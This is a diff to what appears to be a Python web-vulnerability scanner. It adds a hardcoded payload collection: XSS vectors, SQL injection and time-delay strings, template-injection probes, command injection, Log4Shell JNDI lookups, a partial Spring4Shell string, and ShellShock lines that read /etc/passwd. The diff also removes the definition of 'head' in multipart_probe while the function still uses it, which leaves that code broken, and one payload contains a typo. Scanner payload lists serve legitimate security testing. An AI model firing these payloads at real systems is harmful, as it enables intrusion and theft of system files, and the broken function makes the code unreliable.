@@ -460,6 +460,47 @@ def form_urlencoded(k: str, v: str) -> str:
     return urlencode({k: v})
 
 def multipart_probe(name: str, value: str, boundary: str = "----WebSecBoundaryX"):
-    head = f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n"
     tail = f"\r\n--{boundary}--\r\n"
     return head + value + tail
+
+# --- Built-in Payloads (Advanced/Polyglots) ---
+BUILTIN_PAYLOADS = {
+    "polyglot": [
+        "javascript://%250Aalert(1)//\"/*\\'/*\\'/*--></script><xss>",
+        "';WAITFOR DELAY '0:0:5'--",
+        "\"><script>alert(1)</script>",
+        "1;SLEEP(5)#",
+        "1 OR 1=1",
+        "\"-prompt(8)-\"",
+        "'-prompt(8)-'",
+        ";|/usr/bin/id|",
+        "{{7*7}}",
+        "${7*7}",
+        "foo\" onmouseover=\"alert(1)",
+   ],
+   "xss_advanced": [
+       "<svg/onload=alert(1)>",
+       "<iframe/src=javascript:alert(1)>",
+       "<x onfocus=alert(1) autofocus>",
+       "<img src=x onerror=alert(1)>",
+       "\"><svg/onload=confim(1)>",
+       "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+   ],
+   "exploit": [
+       "${jndi:ldap://127.0.0.1:1389/a}", # Log4Shell
+       "${jndi:dns://127.0.0.1:53/a}",
+       "{{7*7}}",
+       "${7*7}",
+       "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di if(%22j%22.equals(%22j%22))...", # Spring4Shell partial
+       "() { :;}; /bin/bash -c 'cat /etc/passwd'", # ShellShock
+       "() { :;}; /bin/echo 'ShellShock'",
+       "pkexec --version",
+       "/bin/sh -c 'id'",
+       "cat /etc/passwd",
+       "root:x:0:0",
+   ]
+}
+
+def get_builtin_payloads(category: str) -> List[str]:
+    """Return hardcoded advanced payloads for a given category."""
+    return list(BUILTIN_PAYLOADS.get(category, []))
